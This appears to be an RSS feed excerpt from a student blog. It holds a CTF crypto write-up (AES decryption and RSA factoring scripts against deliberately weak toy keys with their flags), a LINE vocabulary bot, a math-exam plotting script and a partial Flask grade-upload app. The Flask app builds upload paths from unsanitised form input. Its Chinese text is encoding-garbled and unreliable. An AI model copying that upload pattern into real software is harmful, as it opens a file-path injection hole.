key_hex = &amp;#39;d1e138810051ac8deaef9fd33c969e080003d3f87d264dd431190f0e7795528b&amp;#39;
iv_hex = &amp;#39;25741419227aece3cb4f715f1c2b3878&amp;#39;

cipher = binascii.unhexlify(cipher_hex)
key = binascii.unhexlify(key_hex)
iv = binascii.unhexlify(iv_hex)

cipher_obj = AES.new(key, AES.MODE_CBC, iv)

try:
    decrypted_padded = cipher_obj.decrypt(cipher)
    ans = binascii.hexlify(decrypted_padded).decode(&amp;#39;utf-8&amp;#39;)
    ans = hex_to_ascii(ans)
    print(ans)
except ValueError as e:
    print(&amp;quot;Error:&amp;quot;, e)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{It&amp;#39;s_better_to_know_to_use_Python_to_encrypt/decrypt}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;3 - Asymmetric Cipher&lt;/h2&gt;
&lt;hr&gt;
&lt;h3&gt;1 - Crypto Playground - Calculate RSA&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;È¶ñÂÖàÂòóË©¶ÁÖßËëó Crypto Playground ÁöÑ RSA Ê≠•È©ü‰∏ÄÊ≠•‰∏ÄÊ≠•ÔºàÊØè‰∏ÄÊ≠•ÈÉΩË¶ÅËÆìÂè≥ÈÇäÁöÑÊ™¢Êü•ÈÄöÈÅéÊâçËÉΩÁπºÁ∫å‰∏ã‰∏ÄÊ≠•ÔºâÊääÂ≠óÂÖÉ w Âä†ÂØÜÂæåËß£ÂØÜ

Êé•ËëóÂòóË©¶ÊääË¶ÅÂä†ÂØÜÁöÑÊù±Ë•øÂæû w ËÆäÊàê www ÂæåÂÜçÊìç‰Ωú‰∏ÄÊ¨°

Êìç‰ΩúÂÆåÊàêÂæåÂ∞±ÂèØ‰ª•Áπ≥‰∫§ÈÄôÈ°åÁöÑ flag : FLAG{w-&amp;gt;www}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3&gt;2 - Calculate RSA&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Â¶ÇÊûúÊúâ‰ª•‰∏ãÁöÑÂèÉÊï∏ÔºåÊÉ≥Ëæ¶Ê≥ïÈÇÑÂéü mÔºà‰πüÂ∞±ÊòØ c Â∞çÊáâÁöÑÊòéÊñáÔºâ

p : 9835210563207632773
q : 10100395802203591453
e : 65537
c : 38901730400489769669866798139902101966
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
import sympy

p = 9835210563207632773
q = 10100395802203591453
e = 65537
c = 38901730400489769669866798139902101966
n = p * q
phi_n = (p - 1) * (q - 1)
d = sympy.mod_inverse(e, phi_n)
m = pow(c, d, n)
m_bytes = m.to_bytes((m.bit_length() + 7) // 8)
ans = m_bytes.decode(&amp;#39;utf-8&amp;#39;)

print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;FLAG{^_^}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;3 - Baby RSA&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://factordb.com/&quot;&gt;https://factordb.com/&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ÂòóË©¶Âà©Áî®‰ª•‰∏ãÂèÉÊï∏Á†¥Ëß£ c

n : 13910994564373802167
e : 65537
c : 1407190981767527409
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
import sympy

p = 3538692379
q = 3931111573
e = 65537
c = 1407190981767527409
# n = 3538692379 * 3931111573

n = 13910994564373802167
phi_n = (p - 1) * (q - 1)
d = sympy.mod_inverse(e, phi_n)
m = pow(c, d, n)
m_bytes = m.to_bytes((m.bit_length() + 7) // 8)
ans = m_bytes.decode(&amp;#39;utf-8&amp;#39;)

print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{&amp;gt;&amp;lt;}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;4 - Fermat Factorization&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;//chal.txt
n, e = (19587702115512625820726258933115749290382334844612502424053794718163357592187340905802291862587895104495960381932789753299005813251948996260611184897562326247682666901501448353047521698592249729834516283480674732105780439116269761997349396715933581609849899129728708922840663620676291576240621853120362443923808843760440882014006768364922012481526403094238006375367123013507968974573352190073292257633888791365308369702512213666185905143646188820887176281342149612272108589506611923214505057652995032329959141214241834219457937303114204179131653711364915208078857401621642027638259900918528159843126369443751432654581, 65537)
c = 14809508634249394893558452640498090344470474977233370068642995529577239063125903654339193829089342286599958099423774430315364606689897708158792085795087913537413061325614538809362728179967067658551451631961128472298086158947566207472019480325726689080054858772427589292753172987340834339682656397647927344725017560020482638665085591254911640209651814182071721929923296769089646566223761778492179802372108005014115841061248387428023122508966754739541458191646360889128169311625988454734758608425890600356875991590804236732489527856297719688715806423429351972578716069190339992852705790784452278002937884704968039421527
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# chal.py
from Crypto.Util.number import getPrime, bytes_to_long, isPrime

from secret import FLAG

base = getPrime(1024) + 1

p = base + getPrime(32)
while not isPrime(p):
    p = base + getPrime(32)

q = base + getPrime(32)
while not isPrime(q):
    q = base + getPrime(32)

n = p * q
e = 65537

c = pow(bytes_to_long(FLAG), e, n)

print(f&amp;#39;{n, e = }&amp;#39;)
print(f&amp;#39;{c = }&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
from sympy import isprime, factorint
from Crypto.Util.number import long_to_bytes
n = 19587702115512625820726258933115749290382334844612502424053794718163357592187340905802291862587895104495960381932789753299005813251948996260611184897562326247682666901501448353047521698592249729834516283480674732105780439116269761997349396715933581609849899129728708922840663620676291576240621853120362443923808843760440882014006768364922012481526403094238006375367123013507968974573352190073292257633888791365308369702512213666185905143646188820887176281342149612272108589506611923214505057652995032329959141214241834219457937303114204179131653711364915208078857401621642027638259900918528159843126369443751432654581
e = 65537
c = 14809508634249394893558452640498090344470474977233370068642995529577239063125903654339193829089342286599958099423774430315364606689897708158792085795087913537413061325614538809362728179967067658551451631961128472298086158947566207472019480325726689080054858772427589292753172987340834339682656397647927344725017560020482638665085591254911640209651814182071721929923296769089646566223761778492179802372108005014115841061248387428023122508966754739541458191646360889128169311625988454734758608425890600356875991590804236732489527856297719688715806423429351972578716069190339992852705790784452278002937884704968039421527
factors = factorint(n)
p, q = list(factors.keys())
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
m = pow(c, d, n)
ans = long_to_bytes(m).decode(&amp;#39;utf-8&amp;#39;)

print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3&gt;5 - Crypto Playground - RSA Signature&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;È¶ñÂÖàÂòóË©¶ÁÖßËëó Crypto Playground ÁöÑ RSA Signature Ê≠•È©ü‰∏ÄÊ≠•‰∏ÄÊ≠•ÔºàÊØè‰∏ÄÊ≠•ÈÉΩË¶ÅËÆìÂè≥ÈÇäÁöÑÊ™¢Êü•ÈÄöÈÅéÊâçËÉΩÁπºÁ∫å‰∏ã‰∏ÄÊ≠•ÔºâÊääÂ≠óÂÖÉ w Á∞ΩÂºµÂæåÈ©óË≠âÁ∞ΩÁ´†

Êé•ËëóÂòóË©¶ÊääË¶ÅÁ∞ΩÂºµÁöÑÊù±Ë•øÂæû w ËÆäÊàê www ÂæåÂÜçÊìç‰Ωú‰∏ÄÊ¨°

Êìç‰ΩúÂÆåÊàêÂæåÂ∞±ÂèØ‰ª•Áπ≥‰∫§ÈÄôÈ°åÁöÑ flag : FLAG{w-&amp;gt;www_AGAIN!!!}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3&gt;6 - Easy RSA 0&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ÂòóË©¶Âà©Áî®‰ª•‰∏ãÂèÉÊï∏Á†¥Ëß£ c

n : 2639362258825246588480470347939064671401603842072135672799
e : 65537
c : 1746618984754679181914163060955061486968283106432500087220
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkrc4a7tA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
from sympy import *

n = 2639362258825246588480470347939064671401603842072135672799
e = 65537
c = 1746618984754679181914163060955061486968283106432500087220

p = 11469368108335263743
q = 12783666266952877523
r = 18001308980066920891

phi_n = (p - 1) * (q - 1) * (r - 1)

d = mod_inverse(e, phi_n)
m = pow(c, d, n)
ans = bytes.fromhex(hex(m)[2:]).decode(&amp;#39;utf-8&amp;#39;)

print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{3_Primes?}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;7 - Easy RSA 1&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ÂòóË©¶Âà©Áî®‰ª•‰∏ãÂèÉÊï∏Á†¥Ëß£ c

n : 558098643612442982869412022469246232193159102034581572625352272974227508724473952162960296832221266344918324209865053779262023996763482052514433441095525096832124022399320433830134804734321051616877085252534068802372830522359759248304816981536234329416042954494512044857893369730186700141160304115005148441761425180202201733261896417588308517257278921240631686899602960449771608786644313798116795435002176570933880511306119378180015212643414069934184998512031405143417
e : 65537
c : 516159413447458442301604958221763534692609641988597871082605764283823956573795619128264278802865129137415684054075645301940202655838462944593710475306765753445494124622433361044097665307358761301082095390555467396319971408496508662769321921809765119753151071758945708372163145352828897339448061094186267610588750722986326168345483999990218154775909728920834392462419411374276336477276222786342486282130486976724901696575277929058329049260487708653226358970107854753057
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H1S1rT7KR.png&quot; alt=&quot;image&quot;&gt;
Ë¶ÅÊ≥®ÊÑè
ÊúâÂπ≥Êñπ
ÁÇ∫^2
Á¨¨‰∫åÂÄãË¶Å+1&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
from sympy import mod_inverse
n = 558098643612442982869412022469246232193159102034581572625352272974227508724473952162960296832221266344918324209865053779262023996763482052514433441095525096832124022399320433830134804734321051616877085252534068802372830522359759248304816981536234329416042954494512044857893369730186700141160304115005148441761425180202201733261896417588308517257278921240631686899602960449771608786644313798116795435002176570933880511306119378180015212643414069934184998512031405143417
e = 65537
c = 516159413447458442301604958221763534692609641988597871082605764283823956573795619128264278802865129137415684054075645301940202655838462944593710475306765753445494124622433361044097665307358761301082095390555467396319971408496508662769321921809765119753151071758945708372163145352828897339448061094186267610588750722986326168345483999990218154775909728920834392462419411374276336477276222786342486282130486976724901696575277929058329049260487708653226358970107854753057
phin = (33493-1)*(33637-1)*(33647-1)*(34313-1)*(34781-1)*(35153-1)*(35447-1)*(35573-1)*(35801-1)*(35899-1)*(35993-1)*(36277-1)*(36353-1)*(36653-1)*(37021-1)*(37139-1)*(37273-1)*(37619-1)*(37897-1)*(38287-1)*(38723-1)*(39251-1)*(39419-1)*(39727-1)*(39863-1)*(40609-1)*(40639-1)*(41269-1)*(41579-1)*(41621-1)*(42179-1)*(42181-1)*(42571-1)*(42899-1)*(43189-1)*(43271-1)*(43607-1)*(43711-1)*(44053-1)*(44621-1)*(44641-1)*(44657-1)*(44711-1)*(45307-1)*(45863-1)*(45971)* (45971-1)* (45917-1)*(46723-1)*(47123-1)*(47513-1)*(47743-1)*(47857-1)*(48023-1)*(48491-1)*(49069-1)*(49261-1)*(49871-1)*(49937-1)*(49999-1)*(51059-1)*(51109-1)*(51203-1)*(51817-1)*(51869-1)*(52223-1)*(52999-1)*(53593-1)*(54293-1)*(54323-1)*(54449-1)*(55163-1)*(55667-1)*(55843-1)*(56431-1)*(56509-1)*(56941-1)*(56951-1)*(57037-1)*(57269-1)*(57809-1)*(58679-1)*(61091-1)*(61141-1)*(61297-1)*(61543-1)*(61651-1)*(62401-1)*(62683-1)*(63031-1)*(63131-1)*(63197-1)*(63601-1)*(63617-1)*(63781-1)*(63977-1)*(64037-1)*(64067-1)*(64567-1)*(65119-1)*(65203-1)
d = mod_inverse(e, phin)
m = pow(c, d, n)
ans = bytes.fromhex(hex(m)[2:]).decode(&amp;#39;utf-8&amp;#39;)
print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{WWWait???_Too_many_primes!!!}&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sun, 28 Jul 2024 22:38:38 GMT</pubDate></item><item><title>line_bot</title><link>https://yih-0118.github.io/blog/line-bot/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/line-bot/</guid><description>ÊòéÂÄ´ÂñÆÂ≠óÂç°ÁöÑÁ©∂Ê•µÂª∂‰º∏Ôºåline apiÂ•ΩË≤¥</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/line-bot/&quot;&gt;https://yih-0118.github.io/blog/line-bot/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;ÊòéÂÄ´ÂñÆÂ≠óÂç°Line BotÊåá‰ª§‰ªãÁ¥π&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJ-Fo_ltA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;start - ÊØè5ÂàÜÈêòÁôºÈÄÅ‰∏ÄÂÄãÈö®Ê©üÂñÆÂ≠ó&lt;/li&gt;
&lt;li&gt;stop - ÂÅúÊ≠¢ÁôºÈÄÅÂñÆÂ≠ó&lt;/li&gt;
&lt;li&gt;asterjen - ‰∏ÄÂè•ÈºìÂãµÁöÑË©±&lt;/li&gt;
&lt;li&gt;crazy - ÊØè3ÁßíÁôºÈÄÅ‰∏ÄÂÄãÈö®Ê©üÂñÆÂ≠ó&lt;/li&gt;
&lt;li&gt;help - È°ØÁ§∫Ê≠§Ë™™ÊòéË®äÊÅØ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Á®ãÂºèÁ¢ºÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const linebot = require(&amp;#39;linebot&amp;#39;);
const fs = require(&amp;#39;fs&amp;#39;);
const path = require(&amp;#39;path&amp;#39;);

const bot = linebot({
  channelId: &amp;#39;?&amp;#39;,
  channelSecret: &amp;#39;?&amp;#39;,
  channelAccessToken: &amp;#39;?&amp;#39;
});

// ËÆÄÂèñÊâÄÊúâ JSON Ê™îÊ°à
const vocabularyPath = path.join(__dirname, &amp;#39;vocabulary-list&amp;#39;);
const allVocabularies = [];

function readVocabularyFiles(dir) {
  const items = fs.readdirSync(dir, { withFileTypes: true });

  items.forEach(item =&amp;gt; {
    const itemPath = path.join(dir, item.name);

    if (item.isDirectory()) {
      readVocabularyFiles(itemPath);
    } else if (item.isFile() &amp;amp;&amp;amp; path.extname(item.name) === &amp;#39;.json&amp;#39;) {
      try {
        const data = JSON.parse(fs.readFileSync(itemPath, &amp;#39;utf8&amp;#39;));
        if (Array.isArray(data.vocabularies)) {
          data.vocabularies.forEach(vocab =&amp;gt; {
            vocab.source = path.basename(itemPath, &amp;#39;.json&amp;#39;); // Âè™‰øùÁïôÊ™îÂêçÔºå‰∏çÂåÖÊã¨ .json
          });
          allVocabularies.push(...data.vocabularies);
        }
      } catch (error) {
        console.error(`Error reading file ${itemPath}:`, error);
      }
    }
  });
}

readVocabularyFiles(vocabularyPath);

console.log(`Loaded ${allVocabularies.length} vocabularies in total.`);

// Èö®Ê©üÈÅ∏Êìá‰∏ÄÂÄãÂñÆÂ≠ó
function getRandomVocabulary() {
  const randomIndex = Math.floor(Math.random() * allVocabularies.length);
  return allVocabularies[randomIndex];
}

const userIntervals = {};

// ÂÆöÊôÇÁôºÈÄÅÂñÆÂ≠ó
function sendVocabulary(userId) {
  if (userIntervals[userId]) {
    clearInterval(userIntervals[userId]);
  }

  userIntervals[userId] = setInterval(() =&amp;gt; {
    const vocabulary = getRandomVocabulary();
    const message = `ÂñÆÂ≠óÔºö${vocabulary.vocabulary} (${vocabulary.partOfSpeech})\n‰∏≠ÊñáÔºö${vocabulary.chinese}\nÂá∫ËôïÔºö${vocabulary.source}`;
    bot.push(userId, message);
  }, 5 * 60 * 1000); 
}

function sendVocabulary_fuck(userId) {
  if (userIntervals[userId]) {
    clearInterval(userIntervals[userId]);
  }

  userIntervals[userId] = setInterval(() =&amp;gt; {
    const vocabulary = getRandomVocabulary();
    const message = `ÂñÆÂ≠óÔºö${vocabulary.vocabulary} (${vocabulary.partOfSpeech})\n‰∏≠ÊñáÔºö${vocabulary.chinese}\nÂá∫ËôïÔºö${vocabulary.source}`;
    bot.push(userId, message);
  },3000); // ÊØè 3 ÁßíÁôºÈÄÅ‰∏ÄÊ¨°
}

// ÂÅúÊ≠¢ÁôºÈÄÅÂñÆÂ≠ó
function stopSendingVocabulary(userId) {
  if (userIntervals[userId]) {
    clearInterval(userIntervals[userId]);
    delete userIntervals[userId];
  }
}

const botInstructions = `Ê≠°Ëøé‰ΩøÁî®ÊòéÂÄ´ÂñÆÂ≠óÂç°ÔºÅ
‰ª•‰∏ãÊòØÂèØÁî®ÁöÑÊåá‰ª§Ôºö
1. start - ÊØè5ÂàÜÈêòÁôºÈÄÅ‰∏ÄÂÄãÈö®Ê©üÂñÆÂ≠ó
2. stop - ÂÅúÊ≠¢ÁôºÈÄÅÂñÆÂ≠ó
3. asterjen - ‰∏ÄÂè•ÈºìÂãµÁöÑË©±
4. crazy - ÊØè3ÁßíÁôºÈÄÅ‰∏ÄÂÄãÈö®Ê©üÂñÆÂ≠ó
5. help - È°ØÁ§∫Ê≠§Ë™™ÊòéË®äÊÅØ`;
bot.on(&amp;#39;message&amp;#39;, function (event) {
  // Check the message type
  switch (event.message.type) {
    case &amp;#39;text&amp;#39;:
      handleTextMessage(event);
      break;
    case &amp;#39;sticker&amp;#39;:
      handleStickerMessage(event);
      break;
    default:
      handleOtherMessage(event);
  }
});

function handleTextMessage(event) {
  const userMessage = event.message.text.toLowerCase();

  switch (userMessage) {
    case &amp;#39;start&amp;#39;:
      event.reply(&amp;#39;‰πãÂæåÊØè5ÂàÜÈêòÊúÉÂÇ≥‰∏ÄÂÄãÂñÆÂ≠óÁµ¶‰Ω†~&amp;#39;);
      sendVocabulary(event.source.userId);
      break;
    case &amp;#39;crazy&amp;#39;:
      event.reply(&amp;#39;Êé•ÊãõÂêßÂìàÂìàÂìàÔºÅ&amp;#39;);
      sendVocabulary_fuck(event.source.userId);
      break;
    case &amp;#39;stop&amp;#39;:
      stopSendingVocabulary(event.source.userId);
      event.reply(&amp;#39;Â∑≤ÂÅúÊ≠¢ÔºÅ&amp;#39;);
      break;
    case &amp;#39;help&amp;#39;:
      event.reply(botInstructions);
      break;
    case &amp;#39;asterjen&amp;#39;:
      event.reply(&amp;#39;Ê≤í‰∫ãÂéªÂ§öÊãúÊãúÔºåÂÅöÂ•Ω‰∫ãÔºåÊôÇÊôÇËßÄÂäüÂøµÊÅ©üëç&amp;#39;);
      break;
    default:
      event.reply(botInstructions);
  }
}

function handleStickerMessage(event) {
  event.reply(&amp;#39;Êî∂Âà∞‰Ω†ÁöÑË≤ºÂúñ‰∫ÜÔºÅ‰∏çÈÅéÊàëÂè™ËÉΩËôïÁêÜÊñáÂ≠óË®äÊÅØÂñî„ÄÇ&amp;#39;);
  event.reply(botInstructions);
}

function handleOtherMessage(event) {
  event.reply(&amp;#39;Êä±Ê≠âÔºåÊàëÂè™ËÉΩËôïÁêÜÊñáÂ≠óË®äÊÅØ„ÄÇ&amp;#39;);
  event.reply(botInstructions);
}

bot.listen(&amp;#39;/linewebhook&amp;#39;, 3000, function () {
  console.log(&amp;#39;Ê©üÂô®‰∫∫Â∑≤ÂïüÂãïÔºÅ&amp;#39;);
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰ΩøÁî®Á§∫ÁØÑÔºö
&lt;img src=&quot;https://hackmd.io/_uploads/SkqFhOgtR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Fri, 26 Jul 2024 09:29:46 GMT</pubDate></item><item><title>113Êï∏Ôº°ÈÅ∏Êìá17</title><link>https://yih-0118.github.io/blog/113%E6%95%B8a%E9%81%B8%E6%93%8717/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/113%E6%95%B8a%E9%81%B8%E6%93%8717/</guid><description>Ê®°ËÄÉËÄÉÂÆåËá™Â∑±È©óË≠âÁ≠îÊ°à</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/113%E6%95%B8a%E9%81%B8%E6%93%8717/&quot;&gt;https://yih-0118.github.io/blog/113%E6%95%B8a%E9%81%B8%E6%93%8717/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryi9b8o_R.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ÂÖ∂‰∏≠&lt;code&gt;in_R&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def in_R(x, y):
    return (x &amp;gt;= abs(x-y) and y &amp;gt;= abs(x-y) and 1-x &amp;gt;= abs(x-y) and 1-y &amp;gt;= abs(x-y))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(x, y) ÊòØÂê¶Âú®ÂçÄÂüü R ÂÖß„ÄÇÂõõÂÄãÊ¢ù‰ª∂Ôºö&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;x &amp;gt;= abs(x-y)&lt;/code&gt;: Á¢∫‰øùÈªûÂà∞Â∑¶ÈÇäÁïåÁöÑË∑ùÈõ¢‰∏çÂ∞èÊñº |x-y|&lt;/li&gt;
&lt;li&gt;&lt;code&gt;y &amp;gt;= abs(x-y)&lt;/code&gt;: Á¢∫‰øùÈªûÂà∞‰∏ãÈÇäÁïåÁöÑË∑ùÈõ¢‰∏çÂ∞èÊñº |x-y|&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1-x &amp;gt;= abs(x-y)&lt;/code&gt;: Á¢∫‰øùÈªûÂà∞Âè≥ÈÇäÁïåÁöÑË∑ùÈõ¢‰∏çÂ∞èÊñº |x-y|&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1-y &amp;gt;= abs(x-y)&lt;/code&gt;: Á¢∫‰øùÈªûÂà∞‰∏äÈÇäÁïåÁöÑË∑ùÈõ¢‰∏çÂ∞èÊñº |x-y|&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ÂÖ∑È´î‰æÜË™™Ôºö&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Â¶ÇÊûú x &amp;lt; |x-y|ÔºåÈÇ£È∫ºËè±ÂΩ¢ÁöÑÂ∑¶È†ÇÈªûÊúÉË∂ÖÂá∫Ê≠£ÊñπÂΩ¢ÁöÑÂ∑¶ÈÇäÁïå„ÄÇ&lt;/li&gt;
&lt;li&gt;Â¶ÇÊûú y &amp;lt; |x-y|ÔºåÈÇ£È∫ºËè±ÂΩ¢ÁöÑ‰∏ãÈ†ÇÈªûÊúÉË∂ÖÂá∫Ê≠£ÊñπÂΩ¢ÁöÑ‰∏ãÈÇäÁïå„ÄÇ&lt;/li&gt;
&lt;li&gt;Â¶ÇÊûú 1-x &amp;lt; |x-y|ÔºåÈÇ£È∫ºËè±ÂΩ¢ÁöÑÂè≥È†ÇÈªûÊúÉË∂ÖÂá∫Ê≠£ÊñπÂΩ¢ÁöÑÂè≥ÈÇäÁïå„ÄÇ&lt;/li&gt;
&lt;li&gt;Â¶ÇÊûú 1-y &amp;lt; |x-y|ÔºåÈÇ£È∫ºËè±ÂΩ¢ÁöÑ‰∏äÈ†ÇÈªûÊúÉË∂ÖÂá∫Ê≠£ÊñπÂΩ¢ÁöÑ‰∏äÈÇäÁïå„ÄÇ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Âè™ÊúâÁï∂ÈÄôÂõõÂÄãÊ¢ù‰ª∂ÈÉΩÊªøË∂≥ÊôÇÔºå(x, y) ÊâçË¢´Ë™çÁÇ∫Âú®R ÂÖß„ÄÇ&lt;/p&gt;
&lt;hr&gt;
&lt;h3&gt;Áî®pythonÁï´Âá∫‰æÜ&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import numpy as np
import matplotlib.pyplot as plt
def in_R(x, y):return (x &amp;gt;= abs(x-y) and y &amp;gt;= abs(x-y) and 1-x &amp;gt;= abs(x-y) and 1-y &amp;gt;= abs(x-y))
x = np.linspace(0, 1, 500)
y = np.linspace(0, 1, 500)
X, Y = np.meshgrid(x, y)
R = np.frompyfunc(in_R, 2, 1)(X, Y).astype(np.float64)
plt.figure(figsize=(10, 10))
plt.imshow(R, extent=[0, 1, 0, 1],origin=&amp;#39;lower&amp;#39;,cmap=&amp;#39;Blues&amp;#39;)
plt.xlabel(&amp;#39;x&amp;#39;)
plt.ylabel(&amp;#39;y&amp;#39;)
plt.grid(True)
plt.show()
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ê®ôÈªûÂæå
&lt;img src=&quot;https://hackmd.io/_uploads/SJdkBUoO0.png&quot; alt=&quot;722&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$\sqrt{(\frac{1}{3}-\frac{2}{2})^2+(\frac{2}{3}-\frac{1}{3})^2}  \times \sqrt{1^2+1^2} \times \frac{1}{2} = \frac{1}{3}$$&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Mon, 22 Jul 2024 11:55:20 GMT</pubDate></item><item><title>ÊàêÁ∏æÁôªË®ò</title><link>https://yih-0118.github.io/blog/%E6%88%90%E7%B8%BE%E7%99%BB%E8%A8%98/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/%E6%88%90%E7%B8%BE%E7%99%BB%E8%A8%98/</guid><description>‰∏ÄÂÄãË∂ÖÁ∞°ÊòìÁöÑÊàêÁ∏æÁôªË®òÁ∂≤Á´ô</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/%E6%88%90%E7%B8%BE%E7%99%BB%E8%A8%98/&quot;&gt;https://yih-0118.github.io/blog/%E6%88%90%E7%B8%BE%E7%99%BB%E8%A8%98/&lt;/a&gt;&lt;/blockquote&gt; &lt;ul&gt;
&lt;li&gt;‰ª•‰∏ãÊòØÁî±python webÊâÄÊû∂ÁöÑÊàêÁ∏æÁπ≥‰∫§Á∂≤Á´ô
Áï∂ÂππÈÉ®Â∞èËÄÅÂ∏´ÁöÑÔºå&lt;del&gt;ÈÉΩÊá∂ÂæóËº∏ÂÖ•ÊàêÁ∏æ&lt;/del&gt;ÔºåÊâÄ‰ª•ÊàëÂØ´‰∫ÜÂÄãÂ•ΩÊù±Ë•ø
Â¶ÇÊûúÊÄïÂ∞çÊñπËº∏ÂÖ•ÂÅáÊàêÁ∏æÔºåÈÇÑÊúâ‰∏äÂÇ≥ÂúñÁâáÁöÑÂäüËÉΩ
&lt;strong&gt;Á¨¨‰∏ÄÊ¨°Áé©python webÂìàÂìà&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Êï¥È´î‰ΩàÂ±Ä&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;.
‚îú‚îÄ‚îÄ app.py
‚îú‚îÄ‚îÄ grades.csv
‚îú‚îÄ‚îÄ templates
‚îÇ   ‚îú‚îÄ‚îÄ index.html
‚îÇ   ‚îî‚îÄ‚îÄ success.html
‚îî‚îÄ‚îÄ uploads
    ‚îî‚îÄ‚îÄ 4.jpg
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# app.py
from flask import Flask, request, render_template, redirect, url_for
import os
app = Flask(__name__)
UPLOAD_FOLDER = &amp;#39;uploads&amp;#39;
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route(&amp;#39;/&amp;#39;)
def index():
    return render_template(&amp;#39;index.html&amp;#39;)

@app.route(&amp;#39;/submit&amp;#39;, methods=[&amp;#39;POST&amp;#39;])
def submit():
    seatNumber = request.form[&amp;#39;seatNumber&amp;#39;]
    score = request.form[&amp;#39;score&amp;#39;]
    photo = request.files[&amp;#39;photo&amp;#39;]
    
    if photo:
        filename = f&amp;quot;{seatNumber}.jpg&amp;quot;  
        photo.save(os.path.join(UPLOAD_FOLDER, filename))
    
    with open(&amp;#39;grades.csv&amp;#39;, &amp;#39;a&amp;#39;) as file:
        file.write(f&amp;#39;{seatNumber}, {score}\n&amp;#39;)
    
    return redirect(url_for(&amp;#39;success&amp;#39;))

@app.route(&amp;#39;/success&amp;#39;)
def success():
